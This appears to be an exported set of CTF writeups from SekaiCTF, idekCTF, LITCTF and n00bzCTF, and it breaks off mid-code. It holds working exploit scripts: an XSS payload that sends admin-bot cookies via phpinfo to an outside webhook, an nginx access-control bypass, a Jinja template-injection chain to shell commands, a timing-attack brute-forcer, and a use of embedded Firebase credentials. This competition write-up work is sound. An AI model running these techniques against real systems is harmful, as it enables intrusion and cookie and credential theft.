[{"content":"Miku vs. Machine Description: Time limit is 2 seconds for this challenge.\nOfficial resources of challenge\nIntroduction The goal is to distribute the hours of n singers in m shows. Each show has a number of hours equal to l (unknown) and can only change singers once. We also want that each singer will have the same time on stage.\nSolution To solve this problem, I use a greedy strategy that iteratively divides the available singing time among the singers, ensuring that each singer fulfills their required hours.\nT = int(input()) for _ in range(T): n, m = map(int, input().split(' ')) l = n print(l) duration_for_singer = m singers = [duration_for_singer] * n for i in range(len(singers)): while singers[i] \u0026gt; 0: show = [] if (singers[i] - l) \u0026gt;= 0: show.append((l//2, i+1)) show.append((l - l//2, i+1)) singers[i] -= l elif singers[i] \u0026lt; l: show.append((singers[i], i+1)) show.append((l - singers[i], i+2)) singers[i+1] -= l - singers[i] singers[i] = 0 print(f\u0026quot;{show[0][0]} {show[0][1]} {show[1][0]} {show[1][1]}\u0026quot;) Step-by-Step Explanation Initialization The first input T represents the number of test cases. After some experimentation on pen and paper, I noticed that the minimum value of l is equal to the number of singers, so l is set to n. I initialize a list singers of length n, where each element is set to m to represent the remaining singing hours for each singer. Time Distribution Logic I iterate over each singer using a loop. For each singer i, the following steps are performed: While Loop: Continue allocating time to the current singer as long as they have hours remaining (singers[i] \u0026gt; 0). Time Allocation: If the current singer has l or more hours remaining, divide l hours into two chunks: The first chunk is l//2 hours, and the second chunk is l - l//2 hours. Both chunks are allocated to the same singer. Subtract l from the singer\u0026rsquo;s remaining hours. If the current singer has less than l hours remaining: Allocate all remaining hours to the current singer. Allocate the rest of l to the next singer in line (i+2). Subtract the hours from the next singer\u0026rsquo;s total. Output: After each allocation, the result is stored in a list show and printed in the format {hours1} {singer1} {hours2} {singer2}. Output The program prints the number l as the first line for each test case. For each show, the specific distribution of hours between the singers is printed. Example Execution Input n = 4 m = 7\nExecution l = 4 singers = [7, 7, 7, 7]\ni = 0\nshow = (hours:2 singer:1 , hours:2 singer:1) singers = [3, 7, 7, 7]\nshow = ( hours:3 singer:1 , hours:1 singer:2 ) singers = [0, 6, 7, 7]\ni = 1\nshow = ( hours:2 singer:2 , hours:2 singer:2 ) singers = [0, 2, 7, 7]\nshow = ( hours:2 singer:2 , hours:2 singer:3 ) singers = [0, 0, 5, 7]\ni = 2\nshow = ( hours:2 singer:3 , hours:2 singer:3 ) singers = [0, 0, 1, 7]\nshow = ( hours:1 singer:3 , hours:3 singer:4 ) singers = [0, 0, 0, 4]\ni = 3\nshow = ( hours:2 singer:4 , hours:2 singer:4 ) singers = [0, 0, 0, 0] Output 4 2 1 2 1 3 1 1 2 2 2 2 2 2 2 2 3 2 3 2 3 1 3 3 4 2 4 2 4 Conclusion I don\u0026rsquo;t consider this challenge difficult, it\u0026rsquo;s just a greedy algorithm (it takes a lot more to scare a LeetCode boy), but it wasn\u0026rsquo;t immediately clear that the output didn\u0026rsquo;t necessarily have to be the same as that shown in the challenge\u0026rsquo;s PDF , but it was enough to fit the constraints of the problem.\n$ flag: SEKAI{t1nyURL_th1s:_6d696b75766d} Author: Tatore ","permalink":"http://localhost:1313/writeups/sekaictf2024/mikuvsmachine/","title":"Miku vs. Machine"},{"content":"Crack Me Description: Developed for SekaiCTF 2022 but never got a chance to release it. Can you log in and claim the flag?\nIntroduction First rev ctf of Sekai 2024 with an apk attached, so we have a mobile challenge on our hands. The first thing to do (which I strongly advise against in a real environment) is to download and install the app to get a quick overview of what it does.\nAs you can see, the app doesn\u0026rsquo;t allow us to do much more than press the button and log in (without being able to register).\nFirst step The first thing I did was to analyse the apk using an online tool. SISIK\nAnd two interesting pieces of information came up: the first was that it was a react-native app, which helps us a lot in reverse, and that the app was using firebase to handle the backend and probably authentication as well.\nSecond Step The apk is actually a compressed set of java files like a zipper and tar, this then allows us to easily extract the contents with any tool like unzip or 7z (in my case I used extract which is a utils of zsh).\nOnce we have extracted the contents we should find something like this\nAs we can see, we have a huge number of files, but this is where tools like grep or fzf come in.\nThis allows us to search for files based on keywords as in my case: admin,sekai,user,password\nAfter some research we can find us an obfuscated js file named: index.android.bundle\nAfter some research we can find there a file named index.android.bundle with some obfuscated javascript inside, knowing that the application is written in react-native and that inside this file there are keywords like: admin,sekai,password, it is definitely an interesting file.\nThird Step One possible idea might be a react-native app decompiler, which fortunately exists and is easy to find in the case I used: React Native Decompiler\nOnce installed, and running the command react-native-decompiler index.android.bundle -o bundle_deobfuscated, we should find about 800 js files, a bit confusing but understandable with a little effort.\nFourth Step We can reuse grep and fzf to search again for the words of interest.\nBy searching, we manage to find a really interesting file, in which we find the login system that is done in the application.\nfunction _() { var e, o; module25.default(this, _); (e = L.call(this, ...args)).state = { email: \u0026quot;\u0026quot;, password: \u0026quot;\u0026quot;, wrongEmail: false, wrongPwd: false, checked: false, verifying: false, errorTitle: \u0026quot;\u0026quot;, errorMessage: \u0026quot;\u0026quot;, }; e._verifyEmail = ((o = module275.default(function* (t) { t.setState({ verifying: true, }); var n = module478.initializeApp(module477.default), o = module486.getDatabase(n); if ( \u0026quot;admin@sekai.team\u0026quot; !== t.state.email || false === e.validatePassword(t.state.password) ) console.log(\u0026quot;Not an admin account.\u0026quot;); else console.log(\u0026quot;You are an admin...This could be useful.\u0026quot;); var s = module488.getAuth(n); module488 .signInWithEmailAndPassword(s, t.state.email, t.state.password) .then(function (e) { t.setState({ verifying: false, }); var n = module486.ref(o, \u0026quot;users/\u0026quot; + e.user.uid + \u0026quot;/flag\u0026quot;); module486.onValue(n, function () { t.setState({ verifying: false, }); t.setState({ errorTitle: \u0026quot;Hello Admin\u0026quot;, errorMessage: \u0026quot;Keep digging, you are almost there!\u0026quot;, }); t.AlertPro.open(); }); }) .catch(function (e) { // Different error messages }); })), function (e) { return o.apply(this, arguments); }); e.validatePassword = function (e) { if (17 !== e.length) return false; var t = module700.default.enc.Utf8.parse(module456.default.KEY), n = module700.default.enc.Utf8.parse(module456.default.IV); return ( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot; === module700.default.AES.encrypt(e, t, { iv: n, }).ciphertext.toString(module700.default.enc.Hex) ); }; } Now let\u0026rsquo;s analyse the operation of the login\u0026hellip; as we can see the email that checks for the login is only one, that of the admin admin@sekai.team and the password is checked with a function in particular validatePassword.\nGoing to analyse the function, we see that the decryption of a hex string is done via AES, but even more important detail, the IV and the Key are imported from another file, by analysing the form in question we can find out the value of the IV and the Key.\nvar _ = { LOGIN: \u0026quot;LOGIN\u0026quot;, EMAIL_PLACEHOLDER: \u0026quot;user@sekai.team\u0026quot;, PASSWORD_PLACEHOLDER: \u0026quot;password\u0026quot;, BEGIN: \u0026quot;CRACKME\u0026quot;, SIGNUP: \u0026quot;SIGN UP\u0026quot;, LOGOUT: \u0026quot;LOGOUT\u0026quot;, KEY: \u0026quot;react_native_expo_version_47.0.0\u0026quot;, IV: \u0026quot;__sekaictf2023__\u0026quot;, }; exports.default = _; This allows us to easily find the password even with a trivial Python script like this one:\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad key = b\u0026quot;react_native_expo_version_47.0.0\u0026quot;[:32] iv = b\u0026quot;__sekaictf2023__\u0026quot; ciphertext = binascii.unhexlify( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot;) email = \u0026quot;admin@sekai.team\u0026quot; def decrypt_password(): cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) password = decrypted.decode('utf-8') assert len(password) == 17 return password def main(): password = decrypt_password() print(\u0026quot;password:\u0026quot;, password) print(\u0026quot;email: \u0026quot;, email) if __name__ == '__main__': main() # OUTPUT: # password: s3cr3t_SEKAI_P@ss # email: admin@sekai.team PERFECT! It\u0026rsquo;s done, we have the flag, we just need to log in to the application\nOR MAYBE NOT ðŸ˜¥\u0026hellip;\nFifth step After a moment\u0026rsquo;s panic, I resume checking the code and how the login system works; indeed, we can see that as soon as the login is complete, a request is made to the database (probably the firebase realtime database)\nSo, in a sense, the flag has been given to us, we just have to catch it on the fly, and there are two ways of doing that.\nUnintended solution The first solution was to intercept the call and answer from the app to the db and vice versa, but using arch with an NVIDIA video card I had trouble with Android emulation, but you can still find a solution. similar solution\nIntended solution (The one i performed) Given my difficulties with the emulation of the application, I continued my search for code, this time also searching Firebase, and managed to find something very interesting\nvar c = { apiKey: \u0026quot;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk\u0026quot;, authDomain: \u0026quot;crackme-1b52a.firebaseapp.com\u0026quot;, projectId: \u0026quot;crackme-1b52a\u0026quot;, storageBucket: \u0026quot;crackme-1b52a.appspot.com\u0026quot;, messagingSenderId: \u0026quot;544041293350\u0026quot;, appId: \u0026quot;1:544041293350:web:2abc55a6bb408e4ff838e7\u0026quot;, measurementId: \u0026quot;G-RDD86JV32R\u0026quot;, databaseURL: \u0026quot;https://crackme-1b52a-default-rtdb.firebaseio.com\u0026quot;, }; exports.default = c; As you can see, we are faced with a firebase configuration file with sensitive information that allows us to connect directly to the firebase database using js. So in the end we just need to replicate the functions used in the login to get the flag.\nSolution \u0026hellip;\n# filename: exploit.py from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import binascii import subprocess key = b\u0026quot;react_native_expo_version_47.0.0\u0026quot;[:32] iv = b\u0026quot;__sekaictf2023__\u0026quot; ciphertext = binascii.unhexlify( \u0026quot;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026quot;) email = \u0026quot;admin@sekai.team\u0026quot; def get_flag(email, password): process = subprocess.Popen( [\u0026quot;node\u0026quot;, \u0026quot;exploit.js\u0026quot;, email, password], stdout=subprocess.PIPE, stderr=subprocess.PIPE ) stdout, stderr = process.communicate() print(stdout.decode('utf-8')) if stderr: print(stderr.decode('utf-8')) def decrypt_password(): cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) password = decrypted.decode('utf-8') assert len(password) == 17 return password def main(): password = decrypt_password() print(\u0026quot;password:\u0026quot;, password) print(\u0026quot;email: \u0026quot;, email) get_flag(email, password) if __name__ == '__main__': main() // filename: exploit.js import { initializeApp } from \u0026quot;firebase/app\u0026quot;; import { getAuth, signInWithEmailAndPassword } from \u0026quot;firebase/auth\u0026quot;; import { getDatabase, ref, get } from \u0026quot;firebase/database\u0026quot;; import { exit } from \u0026quot;process\u0026quot;; let app = initializeApp({ apiKey: \u0026quot;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk\u0026quot;, authDomain: \u0026quot;crackme-1b52a.firebaseapp.com\u0026quot;, storageBucket: \u0026quot;crackme-1b52a.appspot.com\u0026quot;, projectId: \u0026quot;crackme-1b52a\u0026quot;, messagingSenderId: \u0026quot;544041293350\u0026quot;, appId: \u0026quot;1:544041293350:web:2abc55a6bb408e4ff838e7\u0026quot;, measurementId: \u0026quot;G-RDD86JV32R\u0026quot;, databaseURL: \u0026quot;https://crackme-1b52a-default-rtdb.firebaseio.com\u0026quot;, }); var db = getDatabase(app); var auth = getAuth(app); async function loginAndGetFlag(email, password) { try { const userCredential = await signInWithEmailAndPassword( auth, email, password ); console.log(\u0026quot;Logged in\u0026quot;); var n = ref(db, \u0026quot;users/\u0026quot; + userCredential.user.uid + \u0026quot;/flag\u0026quot;); const snapshot = await get(n); if (snapshot.exists()) { console.log(\u0026quot;Flag value:\u0026quot;, snapshot.val()); } } catch (error) { console.error(\u0026quot;Error logging in or fetching flag:\u0026quot;, error); } } const args = process.argv.slice(2); const email = args[0]; const password = args[1]; $ flag: SEKAI{15_React_N@71v3_R3v3rs3_H@RD???} Author: akiidjk ","permalink":"http://localhost:1313/writeups/sekaictf2024/crackme/","title":"Crack Me"},{"content":" Some Trick Description: Bob and Alice found a futuristic version of opunssl and replaced all their needs for doofy wellmen.\nIntroduction Some Trick was the first cryptography challenge in the 2024 edition of SekaiCTF. The challenge implements a key exchange based on a set of permutations and asks us to retrieve the flag that was used as a key in Bob\u0026rsquo;s first encryption.\nimport random from secrets import randbelow, randbits from flag import FLAG CIPHER_SUITE = randbelow(2**256) print(f\u0026quot;oPUN_SASS_SASS_l version 4.0.{CIPHER_SUITE}\u0026quot;) random.seed(CIPHER_SUITE) GSIZE = 8209 GNUM = 79 LIM = GSIZE**GNUM def gen(n): p, i = [0] * n, 0 for j in random.sample(range(1, n), n - 1): p[i], i = j, j return tuple(p) def gexp(g, e): res = tuple(g) while e: if e \u0026amp; 1: res = tuple(res[i] for i in g) e \u0026gt;\u0026gt;= 1 g = tuple(g[i] for i in g) return res def enc(k, m, G): if not G: return m mod = len(G[0]) return gexp(G[0], k % mod)[m % mod] + enc(k // mod, m // mod, G[1:]) * mod def inverse(perm): res = list(perm) for i, v in enumerate(perm): res[v] = i return res G = [gen(GSIZE) for i in range(GNUM)] FLAG = int.from_bytes(FLAG, 'big') left_pad = randbits(randbelow(LIM.bit_length() - FLAG.bit_length())) FLAG = (FLAG \u0026lt;\u0026lt; left_pad.bit_length()) + left_pad FLAG = (randbits(randbelow(LIM.bit_length() - FLAG.bit_length())) \u0026lt;\u0026lt; FLAG.bit_length()) + FLAG bob_key = randbelow(LIM) bob_encr = enc(FLAG, bob_key, G) print(\u0026quot;bob says\u0026quot;, bob_encr) alice_key = randbelow(LIM) alice_encr = enc(bob_encr, alice_key, G) print(\u0026quot;alice says\u0026quot;, alice_encr) bob_decr = enc(alice_encr, bob_key, [inverse(i) for i in G]) print(\u0026quot;bob says\u0026quot;, bob_decr) Solution The first thing we do is retrieve the CIPHER_SUITE variable to set the random seed and reconstruct the set of permutations G, then we care about retrieving bob_key to ultimately recover the flag.\ns = int(r.recvline().strip().decode().split('.')[-1]) random.seed(s) G = [gen(GSIZE) for i in range(GNUM)] def decm(k, G, val): m = 0 for i in range(GNUM): x = val % GSIZE y = gexp(G[i], k % GSIZE).index(x) m += y * GSIZE ** i val = (val - x) // GSIZE k //= GSIZE return m bob_key = decm(alice_encr, G, bob_encr) Recovering the flag takes a bit more work, I\u0026rsquo;ve only managed a brute-force solution which I optimized the best I could; it\u0026rsquo;s not the best but it does the job.\ndef maketable(g): gg = deepcopy(g) # just to be safe table = {} for i in range(GSIZE): table[i] = gg gg = tuple(gg[i] for i in gg) return table def perm(table, e): res = tuple(table[0]) rbits = reversed(bits(e)) ones = filter(lambda x: x != -1, [i if v == 1 else -1 for i, v in enumerate(rbits)]) for index in ones: res = tuple(res[j] for j in table[index]) return res def findk(queue, event, table, start, end, index, want): for k in range(start, min(GSIZE, end)): if event.is_set(): return if perm(table, k)[index] == want: event.set() queue.put(k) return def deck(m, G, val): key = 0 for i in range(GNUM): x = val % GSIZE table = maketable(G[i]) queue = mp.Queue() event = mp.Event() ps = [mp.Process(target=findk, args=(queue, event, table, start, start + (GSIZE // mp.cpu_count()) + 1, m % GSIZE, x)) for start in range(0, GSIZE, GSIZE // mp.cpu_count())][:mp.cpu_count()] for p in ps: p.start() k = queue.get() if k == 0: return key key += k * GSIZE ** i val = (val - x) // GSIZE m //= GSIZE return key + m * GSIZE ** GNUM key = deck(bob_key, G, bob_encr) The recovered key isn\u0026rsquo;t the flag yet, as it went through some transformations first, but it\u0026rsquo;s clear that the flag\u0026rsquo;s bits are still there in the middle, untouched between the two paddings, so we can just do some shifting until we find it.\nfor i in range(key.bit_length()): shifted = key \u0026gt;\u0026gt; i for j in range(1, shifted.bit_length()): keepmask = (1 \u0026lt;\u0026lt; j) - 1 final = shifted \u0026amp; keepmask dec = final.to_bytes(keepmask.bit_length() // 8 + 1) if b'SEKAI{' in dec: start = dec.index(b'SEKAI') end = start + dec[start:].index(b'}') + 1 print(f'flag: {dec[start:end].decode()}') break else: continue break flag: SEKAI{7c124c1b2aebfd9e439ca1c742d26b9577924b5a1823378028c3ed59d7ad92d1} Author: vympel\n","permalink":"http://localhost:1313/writeups/sekaictf2024/sometrick/","title":"Some Trick"},{"content":" SekaiCTF 2024 Description SekaiCTF is back for its third iteration! This yearâ€™s competition will feature various categories designed to test participantsâ€™ skills and incentivize learning. Our CTF will have more difficult challenges, and are catered towards intermediate and advanced playersâ€”however, there will still be beginner-friendly challenges to welcome players on the newer side.\nUrl Discord Performance Summary CTFs: 3/34 Total points: 369 Position: 136/1230 Rating points: 2.721 Writeups Rev CrackMe Crypto Some trick PPC (Professional Programming \u0026amp; Coding) Miku vs. Machine ","permalink":"http://localhost:1313/writeups/sekaictf/","title":"SekaiCTF 2024"},{"content":"Hello Description: Just to warm you up for the next Fight :\u0026ldquo;D\nIntroduction Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}\nThe with an ngix server\nMoreover, ctf in general gives us the possibility of using an admin bot where the flag is set in the cookies\nSource # filename: index.py \u0026lt;?php function Enhanced_Trim($inp) { $trimmed = array(\u0026quot;\\r\u0026quot;, \u0026quot;\\n\u0026quot;, \u0026quot;\\t\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot; \u0026quot;); return str_replace($trimmed, \u0026quot;\u0026quot;, $inp); } if(isset($_GET['name'])) { $name=substr($_GET['name'],0,23); echo \u0026quot;Hello, \u0026quot;.Enhanced_Trim($_GET['name']); } ?\u0026gt; # filename: info.py \u0026lt;?php phpinfo(); ?\u0026gt; # filename: ngix.conf user www-data; worker_processes 1; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.php index.html index.htm; } location = /info.php { allow 127.0.0.1; deny all; } location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; fastcgi_pass unix:/var/run/php/php8.2-fpm.sock; } } } As you can see, there are 3 main files to focus on\nThe first is the index file where we see how the page works and the filters used, in particular the fact that we cannot use /, spaces, etc. An info.php file which is definitely suspect and not normally needed but probably has a purpose in the challange And the ngix configuration file, which is very important because it is the one that prevents us from accessing info.php in a simple way. Solution This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way\u0026hellip;\nThe first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time\u0026hellip; SO THAT\u0026rsquo;S THE OBJECTIVE, to get your own bot to open /info.php.\nBut how can we do this?\nThe first step is to be able to inject a payload that opens info.php and sends the file somewhere.\nThe only entry point we see is ? name=', which is not sanitised in the best way, in fact by doing \u0026lt;h1\u0026gt;BTC (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic \u0026lt;script\u0026gt;alert('ByteTheCookies') doesn\u0026rsquo;t work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the onerror parameter of tag img with some modifications, in fact, if we insert a classic \u0026lt;img src='invalid. jpg' onerror=\u0026quot;alert('ByteTheCookies')\u0026quot;, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload \u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;alert('ByteTheCookies')\u0026quot; works.\nGOOD we managed to bypass the xss now we have to create the payload we need\u0026hellip;\nSpecifically, I used: fetch('{target}').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});\nThis payload makes an initial request and sends the content to a webhook in the form of a file, so it\u0026rsquo;s all very simple.\nHowever, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.\nHowever, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an eval(atob(payload)).\nBy sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?\nNo, because analysing the nginx configuration we notice an important detail\nlocation = /info.php { allow 127.0.0.1; deny all; } As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.\nThis may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very interesting.\nAs we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.\nSo the final solution becomes:\n# filename: exploit.py import base64 url = \u0026quot;http://idek-hello.chal.idek.team:1337/\u0026quot; url_webhook = 'https://webhook.site/8b10c871-1e0b-4050-8 2e3-e102a73da54e' url_admin = 'https://admin-bot.idek.team/idek-hello' def main(): # Bypass hacktrics https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm target = \u0026quot;http://idek-hello.chal.idek.team:1337/info.php/index.php\u0026quot; exploit = (\u0026quot;fetch('\u0026quot; + target + \u0026quot;').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('\u0026quot;+url_webhook+\u0026quot;',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Dati inviati al webhook');});\u0026quot;).encode() main_payload = base64.b64encode(exploit).decode() payload = \u0026quot;\u0026quot;\u0026quot;\u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;eval(atob('\u0026quot;\u0026quot;\u0026quot; + main_payload + \u0026quot;\u0026quot;\u0026quot;'));\u0026quot;\u0026gt;\u0026quot;\u0026quot;\u0026quot; # Bypassed with %0C final_url_whith_exploit = f\u0026quot;{url}?name={payload}\u0026quot; print(f\u0026quot;Final url: {final_url_whith_exploit}\u0026quot;) # Send the url on the admin bot and download the file on webhook.site print(f\u0026quot;Now copy and paste the url on the admin bot: {url_admin} and send the requeste to the admin bot, after this go to the webhook.site and download the file and search the flag in the file\u0026quot;) if __name__ == '__main__': main() $ flag: idek{Ghazy_N3gm_Elbalad} Author: akiidjk ","permalink":"http://localhost:1313/writeups/idekctf2024/hello/","title":"Hello"},{"content":" IdekCTF 2024 Description idekCTF is an information security CTF competition organized by the idek team and is aimed at the entire spectrum from high school and university students to experienced players. idekCTF will cover the standard Jeopardy-style CTF topics (binary exploitation, reverse engineering, cryptography, web exploitation, and forensics) as well as other, less standard categories.\nUrl Telegram Performance Summary CTFs: 6/35 Total points: 732 Position: 101/1070 Rating points: 5.405 Writeups Web Hello ","permalink":"http://localhost:1313/writeups/idekctf2024/","title":"IdekCTF 2024"},{"content":"Kirbytime Description: Welcome to Kirby\u0026rsquo;s Website.\nIntroduction We find ourselves in front of a very pink Kirby-themed page, where we are asked to enter a password of 7 characters.\nSource # filename: main.py import sqlite3 from flask import Flask, request, redirect, render_template import time app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def login(): message = None if request.method == 'POST': password = request.form['password'] real = 'REDACTED' if len(password) != 7: return render_template('login.html', message=\u0026quot;you need 7 chars\u0026quot;) for i in range(len(password)): if password[i] != real[i]: message = \u0026quot;incorrect\u0026quot; return render_template('login.html', message=message) else: time.sleep(1) if password == real: message = \u0026quot;yayy! hi kirby\u0026quot; return render_template('login.html', message=message) if __name__ == '__main__': app.run(host='0.0.0.0') As we can see in the code at the \u0026lsquo;/\u0026rsquo; endpoint, when the method and post, it takes the password value from the form, checks the length to be 7 and starts iterating over each character to check if it is correct, it triggers a time.sleep(1) otherwise it returns an error.\nSolution The solution is very simple, in fact we can compare it to a kind of time based, when the character is correct we know that the request will take n seconds to return depending on the number of correct characters. With this script we can easily find the flag, but only with a little patience (I recommend a cup of coffee in between).\n# filename: exploit.py import string import requests url = 'redacted' alphabet = string.printable length = 7 correct_flag = 'a' * length correct_letter = 0 flag_list = list(correct_flag) number_of_second_to_wait = 7 while (correct_letter != length): for letter in alphabet: flag_list[correct_letter] = letter flag = \u0026quot;\u0026quot;.join(flag_list) print(flag) payload = {\u0026quot;password\u0026quot;: flag} r = requests.post(url=url, data=payload) assert r.status_code == 200 print(\u0026quot;Time: \u0026quot;, r.elapsed.total_seconds()) if r.elapsed.total_seconds() \u0026gt;= number_of_second_to_wait: correct_letter = correct_letter + 1 number_of_second_to_wait += 1 print(flag) break print(\u0026quot;Flag found: \u0026quot;, \u0026quot;LITCTF{\u0026quot; + flag + \u0026quot;}\u0026quot;) $ flag: LITCTF{kBySlaY} Author: akiidjk ","permalink":"http://localhost:1313/writeups/litctf2024/kirbytime/","title":"Kirbytime"},{"content":" Lexington Informatics Tournament CTF Description Lexington Informatics Tournament CTF 2024 is a Jeopardy-style, beginner-friendly online CTF that\u0026rsquo;s open to everyone.\nUrl Discord Performance Summary CTFs: 18/32 Total points: 2068 Position: 95/830 Rating points: 19.095 Writeups Web Kirbytime ","permalink":"http://localhost:1313/writeups/litctf2024/","title":"Lexington Informatics Tournament CTF 2024"},{"content":"File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!\nIntroduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.\nSource The source has comments added later to allow a better understanding of the code in the writeups\n# filename: server.py #!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): # This function mainly deals with loading the tar file into the server's file system. global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file return render_template_string(\u0026quot;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026quot;) # Otherwise, it renders an error message name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system os.makedirs(f\u0026quot;./uploads/{name}\u0026quot;, exist_ok=True) # Create the directory file.save(f\u0026quot;./uploads/{name}/{name}.tar\u0026quot;) # Save the tar file try: # Extract the tar file tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\u0026quot;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href='/view/{name}'\u0026gt;here\u0026lt;/a\u0026gt;\u0026quot;) except: return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026quot;) @app.route('/view/\u0026lt;name\u0026gt;') def view(name): # This function displays the files contained in the .tar file if not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\u0026quot;./uploads/{name}\u0026quot;) # List all files in the previously created folder out = '\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;' files.remove(f'{name}.tar') # Remove the tar file from the list for i in files: out += f'\u0026lt;a href=\u0026quot;/read/{name}/{i}\u0026quot;\u0026gt;{i}\u0026lt;/a\u0026gt;' # Show via templates all file names # except: return render_template_string(out) # Render the template with the render_template_string function @app.route('/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;') def read(name,file): # The function shows the contents of the single file if (not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) if ((\u0026quot;..\u0026quot; in name) or (\u0026quot;..\u0026quot; in file)) or ((\u0026quot;/\u0026quot; in file) or \u0026quot;/\u0026quot; in name): # Other controls to avoid path er return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) f = open(f'./uploads/{name}/{file}') # Open the file data = f.read() f.close() return data # Return the content of file if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) We can therefore see that there are several parameter checks, and at first one might think that the code is 100% safe.\nSolution The first thing that came to mind was to create a symbolic link to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.\nOnce we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the \u0026lsquo;render_template_string\u0026rsquo; function (a vulnerable function of flask), it is possible to perform a template injection.\n# filename: exploit.py import requests import os import tarfile from bs4 import BeautifulSoup url = 'http://redacted.challs.n00bzunit3d.xyz:8080/' def create_tar(tar_name, file): with tarfile.open(tar_name, 'w') as tar: tar.add(file, arcname=os.path.basename(file)) print(f'Tar file created: {tar_name}') def create_payload(payload): with open(payload, 'w') as f: f.write('Remember to byte the cookies') create_tar('exploit.tar', payload) print(f'Payload created: {payload}') def get_url_view(text): soup = BeautifulSoup(text, 'html5lib') return [a['href'] for a in soup.find_all('a', href=True)][0] def leak_subprocess_index(): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) text = r.text[r.text.index('[')+1:] list_classes = text.split(',') for i, c in enumerate(list_classes): if 'subprocess.Popen' in c: print(f'Index subprocess.Popen: {i}') return str(i) def get_flag(index): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()[\u0026quot; + \\ index + \u0026quot;]('cat *', shell=True, stdout=-1).communicate()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1] print(f'Flag: {flag}') def main(): subprocess_index = 